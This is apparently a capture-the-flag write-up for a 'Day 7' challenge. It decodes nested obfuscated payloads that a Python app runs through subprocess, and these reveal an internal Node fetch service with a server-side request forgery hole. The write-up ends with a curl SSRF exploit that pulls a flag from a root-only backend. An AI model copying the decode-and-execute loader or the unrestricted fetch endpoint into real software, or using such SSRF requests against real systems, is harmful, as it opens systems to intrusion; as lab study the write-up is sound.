# Day 7

## Notable Entry In challenge
```py
if __name__ == '__main__':
    if PAYLOAD:
        decoded = base64.b64decode(PAYLOAD)
        reversed_bytes = decoded[::-1]
        unpacked = bytes(b ^ 0x42 for b in reversed_bytes)
        subprocess.run(unpacked.decode(), shell=True)
    app.run(host='0.0.0.0', port=80, debug=False)
```

## Solution

First I decoded payload that was run with subprocess 

```py
ip netns add middleware
ip link add veth-host type veth peer name veth-middleware
ip link set veth-middleware netns middleware
ip addr add 72.79.72.1/24 dev veth-host
ip link set veth-host up

ip netns exec middleware ip addr add 72.79.72.79/24 dev veth-middleware
ip netns exec middleware ip link set veth-middleware up
ip netns exec middleware ip route add default via 72.79.72.1   
ip netns exec middleware ip link set lo up

iptables -A OUTPUT -o veth-host -m owner --uid-owner root -j ACCEPT
iptables -A OUTPUT -o veth-host -j REJECT

echo "const http = require('http');
const url = require('url');
const { execSync } = require('child_process');

const payload = 'a3IicGd2cHUiY2ZmImRjZW1ncGYMa3IibmtwbSJjZmYieGd2ai9qcXV2InZ7cmcieGd2aiJyZ2d0InBjb2cieGd2ai9kY2VtZ3BmDGtyIm5rcG0idWd2InhndmovZGNlbWdwZiJwZ3ZwdSJkY2VtZ3BmDGtyImNmZnQiY2ZmIjo6MDk5MDg3MDMxNDYiZmd4InhndmovanF1dgxrciJua3BtInVndiJ4Z3ZqL2pxdXYid3IMDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJjZmZ0ImNmZiI6OjA5OTA4NzA6NTE0NiJmZ3gieGd2ai9kY2VtZ3BmDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJ4Z3ZqL2RjZW1ncGYid3IMa3IicGd2cHUiZ3pnZSJkY2VtZ3BmImtyInRxd3ZnImNmZiJmZ2hjd252InhrYyI6OjA5OTA4NzAzIiIiDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJucSJ3cgwMa3J2Y2RuZ3UiL0MiUVdWUldWIi9xInhndmovanF1diIvbyJxeXBndCIvL3drZi9xeXBndCJ0cXF2Ii9sIkNFRUdSVgxrcnZjZG5ndSIvQyJRV1ZSV1YiL3EieGd2ai9qcXV2Ii9sIlRHTEdFVgwMZ3pycXR2IlRDRU1hR1BYP3J0cWZ3ZXZrcXAMDGdlanEiJHRnc3drdGciKXVrcGN2dGMpDAx1Z3YiPGdweGt0cXBvZ3B2LiI8cnRxZndldmtxcAx1Z3YiPGRrcGYuIik6OjA5OTA4NzA6NSkMdWd2IjxycXR2LiI6MgwMaWd2IikxKSJmcQwiIl4kPmozQElxImN5Y3suIntxdylubiJwZ3hndCJoa3BmInZqZyJobmNpPjFqM0BeJAxncGYMDGlndiIpMWhuY2kpImZxDCIia2gicmN0Y291XSl6b2N1KV8iPz8iKWpxanFqcS9rL3ljcHYvdmpnL2huY2kpDCIiIiJIa25nMHRnY2YqKTFobmNpKSsMIiJnbnVnDCIiIiJeJD5qM0B2amN2KXUicHF2ImVxdHRnZXY+MWozQF4kDCIiZ3BmDGdwZgwkIn4ia3IicGd2cHUiZ3pnZSJkY2VtZ3BmIjF3dXQxZGtwMXJqciIvIigM';

if (payload) {
  const decoded = Buffer.from(payload, 'base64');
  const unpacked = Buffer.from(decoded.map(byte => (byte - 2 + 256) % 256));
  execSync(unpacked.toString(), { stdio: 'inherit' });
}

const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url, true);

  if (parsedUrl.pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h1>Welcome to the middleware service. We fetch things!</h1>');
  } else if (parsedUrl.pathname === '/fetch') {
    const targetUrl = parsedUrl.query.url;

    if (!targetUrl) {
      res.writeHead(400, { 'Content-Type': 'text/html' });
      res.end('<h1>Missing url parameter</h1>');
      return;
    }

    try {
      const response = await fetch(targetUrl);
      const content = await response.text();
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(content);
    } catch (error) {
      res.writeHead(500, { 'Content-Type': 'text/html' });
      res.end(\`<h1>Error fetching URL: \${error.message}</h1>\`);
    }
  } else {
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<h1>Not Found</h1>');
  }
});

const PORT = process.env.PORT || 80;
const HOST = \"72.79.72.79\";
server.listen(PORT, HOST, () => {
    console.log(\`Server running on http://\${HOST}:\${PORT}\`);
});
" | ip netns exec middleware /usr/bin/cobol - &
```

We can see here it allows us to make a server side request on our behalf , any endpoint it reaches will see its requesting IP as `72.79.72.79`

```py
else if (parsedUrl.pathname === '/fetch') {
    const targetUrl = parsedUrl.query.url;

```


This program also executed another code with:

```js
execSync(unpacked.toString(), { stdio: 'inherit' });
```

The code is decoded below

### Decoding payload in decoded payload

```

import base64


PAYLOAD = 'a3IicGd2cHUiY2ZmImRjZW1ncGYMa3IibmtwbSJjZmYieGd2ai9qcXV2InZ7cmcieGd2aiJyZ2d0InBjb2cieGd2ai9kY2VtZ3BmDGtyIm5rcG0idWd2InhndmovZGNlbWdwZiJwZ3ZwdSJkY2VtZ3BmDGtyImNmZnQiY2ZmIjo6MDk5MDg3MDMxNDYiZmd4InhndmovanF1dgxrciJua3BtInVndiJ4Z3ZqL2pxdXYid3IMDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJjZmZ0ImNmZiI6OjA5OTA4NzA6NTE0NiJmZ3gieGd2ai9kY2VtZ3BmDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJ4Z3ZqL2RjZW1ncGYid3IMa3IicGd2cHUiZ3pnZSJkY2VtZ3BmImtyInRxd3ZnImNmZiJmZ2hjd252InhrYyI6OjA5OTA4NzAzIiIiDGtyInBndnB1Imd6Z2UiZGNlbWdwZiJrciJua3BtInVndiJucSJ3cgwMa3J2Y2RuZ3UiL0MiUVdWUldWIi9xInhndmovanF1diIvbyJxeXBndCIvL3drZi9xeXBndCJ0cXF2Ii9sIkNFRUdSVgxrcnZjZG5ndSIvQyJRV1ZSV1YiL3EieGd2ai9qcXV2Ii9sIlRHTEdFVgwMZ3pycXR2IlRDRU1hR1BYP3J0cWZ3ZXZrcXAMDGdlanEiJHRnc3drdGciKXVrcGN2dGMpDAx1Z3YiPGdweGt0cXBvZ3B2LiI8cnRxZndldmtxcAx1Z3YiPGRrcGYuIik6OjA5OTA4NzA6NSkMdWd2IjxycXR2LiI6MgwMaWd2IikxKSJmcQwiIl4kPmozQElxImN5Y3suIntxdylubiJwZ3hndCJoa3BmInZqZyJobmNpPjFqM0BeJAxncGYMDGlndiIpMWhuY2kpImZxDCIia2gicmN0Y291XSl6b2N1KV8iPz8iKWpxanFqcS9rL3ljcHYvdmpnL2huY2kpDCIiIiJIa25nMHRnY2YqKTFobmNpKSsMIiJnbnVnDCIiIiJeJD5qM0B2amN2KXUicHF2ImVxdHRnZXY+MWozQF4kDCIiZ3BmDGdwZgwkIn4ia3IicGd2cHUiZ3pnZSJkY2VtZ3BmIjF3dXQxZGtwMXJqciIvIigM'
decoded = base64.b64decode(PAYLOAD)
unpacked = bytes((b - 2 + 256) % 256 ^ 0x42 for b in decoded)

print(unpacked.decode())
```

The resulting code that was executed by `execSync`. This will only allow traffic generated by root-owned processes on the host will be allowed out via `veth-host`

```sh
ip netns add backend
ip link add veth-host type veth peer name veth-backend
ip link set veth-backend netns backend
ip addr add 88.77.65.1/24 dev veth-host
ip link set veth-host up

ip netns exec backend ip addr add 88.77.65.83/24 dev veth-backend
ip netns exec backend ip link set veth-backend up
ip netns exec backend ip route add default via 88.77.65.1   
ip netns exec backend ip link set lo up

iptables -A OUTPUT -o veth-host -m owner --uid-owner root -j ACCEPT
iptables -A OUTPUT -o veth-host -j REJECT

export RACK_ENV=production

echo "require 'sinatra'

set :environment, :production
set :bind, '88.77.65.83'
set :port, 80

get '/' do
  \"<h1>Go away, you'll never find the flag</h1>\"
end

get '/flag' do
  if params['xmas'] == 'hohoho-i-want-the-flag'
    File.read('/flag')
  else
    \"<h1>that's not correct</h1>\"
  end
end
" | ip netns exec backend /usr/bin/php - &
```

Since the first decoded payload runs as a root-owned process, we can use it to make a request to the second process, which has a rule that only allows access from only root-owned processes.


# Final Exploit from localhost 
```sh
curl http://72.79.72.79/fetch?url=http://88.77.65.83/flag?xmas=hohoho-i-want-the-flag
```
